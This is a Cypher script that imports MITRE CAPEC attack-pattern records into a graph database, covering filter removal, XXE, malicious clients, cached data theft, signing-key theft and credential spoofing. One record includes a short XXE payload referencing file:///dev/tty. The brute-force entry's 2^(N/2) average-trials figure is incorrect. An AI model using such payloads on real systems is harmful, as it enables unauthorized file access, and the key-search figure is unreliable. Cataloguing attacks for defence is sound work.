CREATE (:AttackPrerequisite{id: 155, text: "<div level=\"0\">\n  <p class=\"text\">Ciphertext is known.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 156, text: "<div level=\"0\">\n  <p class=\"text\">Encryption algorithm and key size are known.</p>\n</div>"});
CREATE (:Submission{id: 180});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 180, summary: "OrderedDict([('Text', 'An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine the ciphertext and the encryption algorithm.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.</p>\n</div>"});
MERGE (:CWE{id: 326});
MERGE (:CWE{id: 327});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 719});
CREATE (:ResourcesRequired{id: 100, text: "<div level=\"0\">\n  <p class=\"text\">A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).</p>\n  <p class=\"text\">On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext.</p>\n  <p class=\"text\">Obviously as N gets large the brute force approach becomes infeasible.</p>\n</div>"});
CREATE (:AttackPattern{id: 200, name: "Removal of filters: Input filters, output filters, data masking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 157, text: "<div level=\"0\">\n  <p class=\"text\">The target application must utilize some sort of filtering mechanism (input, output, or data masking).</p>\n</div>"});
CREATE (:Submission{id: 181});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 147});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 181, summary: "OrderedDict([('Text', [\"An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content. For example, if an application accepts scripting languages as input, an input filter could constrain the commands received and block those that the application's administrator deems to be overly powerful. An output filter screens responses from an application or person in order to prevent disclosure of sensitive information. For example, an application's output filter might block output that is sourced to sensitive folders or which contains certain keywords. A data mask is similar to an output filter, but usually applies to structured data, such as found in databases. Data masks elide or replace portions of the information returned from a query in order to protect against the disclosure of sensitive information.\", 'If an input filter is removed the attacker will be able to send content to the target and have the target utilize it without it being sanitized. If the content sent by the attacker is executable, the attacker may be able to execute arbitrary commands on the target. If an output filter or data masking mechanism is disabled, the target may send out sensitive information that would otherwise be elided by the filters. If the data mask is disabled, sensitive information stored in a database would be returned unaltered. This could result in the disclosure of sensitive information, such as social security numbers of payment records.', 'This attack is usually executed as part of a larger attack series. The attacker would disable filters and would then mount additional attacks to either insert commands or data or query the target application in ways that would otherwise be prevented by the filters.'])])"});
CREATE (:ResourcesRequired{id: 101, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 201, name: "XML Entity Blowup", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 158, text: "<div level=\"0\">\n  <p class=\"text\">The target must follow external entity references without validating the validity of the reference target.</p>\n</div>"});
CREATE (:Submission{id: 182});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 182, summary: "OrderedDict([('Text', 'An attacker creates an XML document that with an external entity reference. External entity references can take the form of <!ENTITY name system \"uri\"> tags in a DTD. Because processors may not validate documents with external entities, there may be no checks on the nature of the reference in the external entity. This can allow an attacker to open arbitrary files or connections. For example, the following DTD would attempt to open the /dev/tty device:'), ('Block', OrderedDict([('Code', '<!DOCTYPE doc [ <!ENTITY ent SYSTEM \"file:///dev/tty\"> ]>')]))])"});
MERGE (:Reference{local_id: "R.201.1", title: "XXE (Xml eXternal Entity) Attack", publisher: "Beyond Security", link: "http://www.securiteam.com/securitynews/6D0100A5PU.html"});
MERGE (:Reference{local_id: "R.201.2", title: "CESA-2007-002 - rev 2: Sun JDK6 breaks XXE attack protection", link: "http://scary.beasts.org/security/CESA-2007-002.html"});
CREATE (:CVE{id: "CVE-2008-0628", description: "<div level=\"0\">\n  <p class=\"text\">The XML parsing code in Sun Java Runtime Environment JDK and JRE 6 Update 3 and earlier processes external entity references even when the \"external general entities\" property is false, which allows remote attackers to conduct XML external entity (XXE) attacks and cause a denial of service or access restricted resources.</p>\n</div>"});
CREATE (:ResourcesRequired{id: 102, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to trick the target into loading an XML document with crafted external entity reference.</p>\n</div>"});
CREATE (:AttackPattern{id: 202, name: "Create Malicious Client", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 159, text: "<div level=\"0\">\n  <p class=\"text\">The targeted service must make assumptions about the behavior of the client application that interacts with it, which can be abused by an adversary.</p>\n</div>"});
CREATE (:Submission{id: 183});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 183, summary: "OrderedDict([('Text', ['An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures. For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an adversary can take advantage of these assumptions to abuse service functionality. For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the adversary uses a malicious client, however, the adversary could ignore the server input and declare any total price. Likewise, an adversary could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance.', 'Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an adversary can exploit.'])])"});
MERGE (:CWE{id: 602});
CREATE (:ResourcesRequired{id: 103, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.</p>\n</div>"});
CREATE (:AttackPattern{id: 203, name: "Manipulate Application Registry Values", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 160, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must rely on values stored in a registry.</p>\n</div>"});
CREATE (:Submission{id: 184});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 148});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 184, summary: "OrderedDict([('Text', 'An attacker manipulates the registry values used by an application to perform a variety of possible attacks. Many applications utilize registries to store configuration and service information. As such, attacks that manipulate these registries can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of the targeted application. It is important to note that \"registry\" does not only refer to the Microsoft Windows Registry, but to any registry used by an application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes undertaken as part of another attack; for example, a path traversal (inserting relative path modifiers) or buffer overflow (enlarging a registry value beyond an application\\'s ability to store it), but given the long term usage of many registry values, the registry manipulation could be its own end.')])"});
MERGE (:Reference{local_id: "R.203.1", author: "ATT&CK Project", title: "Service Registry Permissions Weakness (1058)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Service_registry_permissions_weakness"});
CREATE (:ResourcesRequired{id: 104, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 204, name: "Lifting Sensitive Data Embedded in Cache", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 161, text: "<div level=\"0\">\n  <p class=\"text\">The target application must store sensitive information in a cache.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 162, text: "<div level=\"0\">\n  <p class=\"text\">The cache must be inadequately protected against attacker access.</p>\n</div>"});
CREATE (:Submission{id: 185});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 149});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 38, name: "Lifting cached, sensitive data embedded in client distributions (thick or thin)"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 185, summary: "OrderedDict([('Text', \"An attacker examines a target application's cache for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.\")])"});
MERGE (:CWE{id: 524});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 105, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.</p>\n</div>"});
CREATE (:AttackPattern{id: 205, name: "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 186});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 150});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 151});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Architectural_Paradigms, Attack_Motivation-Consequences, Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Description, Description Summary, Examples-Instances, Frameworks, Methods_of_Attack, Platforms, Purposes, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:PreviousEntryName{id: 39, name: "Lifting credential(s)/key material embedded in client distributions (thick or thin)"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 186, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-37 : Retrieve Embedded Sensitive Data. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 206, name: "Lifting signing key and signing malicious code from a production environment", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 163, text: "<div level=\"0\">\n  <p class=\"text\">The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the attacker does not need to steal the signing key before forging code bundles in the developer's name.)</p>\n</div>"});
CREATE (:Submission{id: 187});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 187, summary: "OrderedDict([('Text', \"The attacker extracts credentials used for code signing from a production environment and uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the attacker has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the attacker to execute arbitrary code on the victim's computer.\")])"});
CREATE (:ResourcesRequired{id: 106, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 207, name: "Removing Important Client Functionality", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 164, text: "<div level=\"0\">\n  <p class=\"text\">The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client.</p>\n</div>"});
CREATE (:Submission{id: 188});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 152});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Vulnerabilities"});
CREATE (:PreviousEntryName{id: 40, name: "Removing Important Functionality from the Client"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 188, summary: "OrderedDict([('Text', \"An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Probing", description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes by exploring an application's functionality and its underlying mapping to server-side components.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The server relies on some functionality on the client for correct and secure operation.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The server does not rely on any functionality on the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of functionality on the client that the server assumes to be present and trustworthy."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine which functionality to disable or remove", description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker reverse engineers the client-side code to determine which functionality to disable or remove.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker understands and can disable or remove the critical functionality from the client code."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Disable or remove the critical functionality from the client code", description: "<div level=\"0\">\n  <p class=\"text\">Once the functionality has been determined, the attacker disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker can perform malicious actions that the server believes are prohibited."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-6", local_id: "R.207.1", title: "Wikipedia", section: "Greasemonkey", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Greasemonkey"});
MERGE (:Reference{local_id: "R.207.2", title: "Firebug", link: "http://getfirebug.com/"});
MERGE (:Reference{local_id: "R.207.3", title: "Mozilla Firefox Add-ons", section: "Greasemonkey", link: "https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/"});
CREATE (:CVE{id: "CVE-2007-0968", description: "<div level=\"0\">\n  <p class=\"text\">Unspecified vulnerability in Cisco Firewall Services Module (FWSM) before 2.3(4.7) and 3.x before 3.1(3.1) causes the access control entries (ACE) in an ACL to be improperly evaluated, which allows remote authenticated users to bypass intended certain ACL protections.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-0802", description: "<div level=\"0\">\n  <p class=\"text\">Mozilla Firefox 2.0.0.1 allows remote attackers to bypass the Phishing Protection mechanism by adding certain characters to the end of the domain name, as demonstrated by the \".\" and \"/\" characters, which is not caught by the Phishing List blacklist filter.</p>\n</div>"});
CREATE (:CVE{id: "VU#258834", description: "<div level=\"0\">\n  <p class=\"text\">WebEOC ties privileges and roles to client-side resources. If an attacker can access a resource directly, that attacker will be granted all the privileges associated with that resource.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2009-0247", description: "<div level=\"0\">\n  <p class=\"text\">The server for 53KF Web IM 2009 Home, Professional, and Enterprise editions relies on client-side protection mechanisms against cross-site scripting (XSS), which allows remote attackers to conduct XSS attacks by using a modified client to send a crafted IM message, related to the msg variable.</p>\n</div>"});
MERGE (:CWE{id: 602});
CREATE (:ResourcesRequired{id: 107, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.</p>\n</div>"});
CREATE (:AttackPattern{id: 208, name: "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 165, text: "<div level=\"0\">\n  <p class=\"text\">The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations.</p>\n</div>"});
CREATE (:Submission{id: 189});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 153});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 189, summary: "OrderedDict([('Text', 'An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.')])"});
MERGE (:CWE{id: 602});
CREATE (:ResourcesRequired{id: 108, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have access to the client for the targeted service. (This step is trivial for most web-based services.) The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.</p>\n</div>"});
CREATE (:AttackPattern{id: 209, name: "XSS Using MIME Type Mismatch", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 166, text: "<div level=\"0\">\n  <p class=\"text\">The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 167, text: "<div level=\"0\">\n  <p class=\"text\">The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.</p>\n</div>"});
CREATE (:Submission{id: 190});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 154});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"});
CREATE (:PreviousEntryName{id: 41, name: "Cross-Site Scripting Using MIME Type Mismatch"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 190, summary: "OrderedDict([('Text', \"An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.\")])"});
MERGE (:Reference{id: "REF-4", local_id: "R.209.1", title: "OWASP Testing Guide", section: "Testing for Stored Cross site scripting (OWASP-DV-002)", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)"});
CREATE (:CVE{id: "CVE-2001-0999", description: "<div level=\"0\">\n  <p class=\"text\">Outlook Express 6.00 allows remote attackers to execute arbitrary script by embedding SCRIPT tags in a message whose MIME content type is text/plain, contrary to the expected behavior that text/plain messages will not run script.</p>\n</div>"});
MERGE (:CWE{id: 79});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 646});
CREATE (:ResourcesRequired{id: 109, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have the ability to source the file of the incorrect MIME type containing a script.</p>\n</div>"});
CREATE (:AttackPattern{id: 21, name: "Exploitation of Trusted Credentials", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 168, text: "<div level=\"0\">\n  <p class=\"text\">Server software must rely on weak session IDs proof and/or verification schemes</p>\n</div>"});
CREATE (:Submission{id: 191});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 155});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 42, name: "Exploitation of Session Variables, Resource IDs and other Trusted Credentials"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 191, summary: "OrderedDict([('Text', ['Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so.', 'Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes \"trust\" other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points.', 'Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers.', \"The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application for Indicators of Susceptibility", description: "<div level=\"0\">\n  <p class=\"text\">Using a variety of methods, until one is found that applies to the target system. the attacker probes for credentials, session tokens, or entry points that bypass credentials altogether.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider all available pages</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attack known bad interfaces</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Session IDs are used</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Open access points exist that use no user IDs or passwords, but determine authorization based on message content</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Session IDs are identifiable"});
CREATE (:Outcome{id: 2, type: "Success", description: "Open channels are available"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Fetch samples", description: "<div level=\"0\">\n  <p class=\"text\">An attacker fetches many samples of a session ID. This may be through legitimate access (logging in, legitimate connections, etc) or just systematic probing.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes many anonymous connections and records the session IDs assigned.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes authorized connections and records the session tokens or credentials issued.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">An attacker gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connections from it, attempting to gain the same privileges as a trusted system.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Trust in the system is based on IP address, MAC address, network locality, or other general network characteristic.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Web applications use session IDs</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Network systems issue session IDs or connection IDs</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Systems or applications grant trust based on logical or physical network locality."});
CREATE (:Outcome{id: 2, type: "Success", description: "Session identifiers successfully spoofed"});
CREATE (:Outcome{id: 3, type: "Failure", description: "No session IDs can be found or exploited"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Impersonate", description: "<div level=\"0\">\n  <p class=\"text\">An attacker can use successful experiments to impersonate an authorized user or system</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Corrective"});
CREATE (:AttackStep{id: 2, title: "Spoofing", description: "<div level=\"0\">\n  <p class=\"text\">Bad data can be injected into the system by an attacker.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Unauthorized data is injected into an application."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Corrective"});
MERGE (:Reference{id: "REF-2", local_id: "R.21.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 290});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 539});
MERGE (:CWE{id: 6});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 664});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 642});
CREATE (:ResourcesRequired{id: 110, text: "<div level=\"0\">\n  <p class=\"text\">Ability to deploy software on network. Ability to communicate synchronously or asynchronously with server</p>\n</div>"});
CREATE (:AttackPattern{id: 211, name: "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 192});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 156});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 157});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Resources_Required, Typical_Severity"});
CREATE (:PreviousEntryName{id: 43, name: "Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 192, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it was not a legitimate attack pattern, but rather a technique used by adversaries.')])"});
